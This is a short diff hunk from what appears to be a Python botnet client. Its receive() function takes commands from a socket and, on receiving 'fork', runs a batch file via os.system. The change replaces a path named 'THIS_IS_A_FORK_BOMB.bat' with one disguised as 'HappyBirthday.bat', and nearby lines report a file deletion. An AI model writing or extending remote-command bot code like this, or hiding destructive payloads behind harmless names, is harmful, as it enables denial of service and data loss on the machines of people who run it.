@@ -52,7 +52,7 @@ def receive():
         print("File deleted")
 
     if bytes("fork", 'utf-8') in a:
-        os.system("This PC/Desktop/botnet-stub-distributor-master/THIS_IS_A_FORK_BOMB.bat")
+        os.system("C://Users//iD Student//Desktop//Botnet//HappyBirthday.bat")
     else:
         a2 = c.recv(500)
         print('Received message == ',a2)
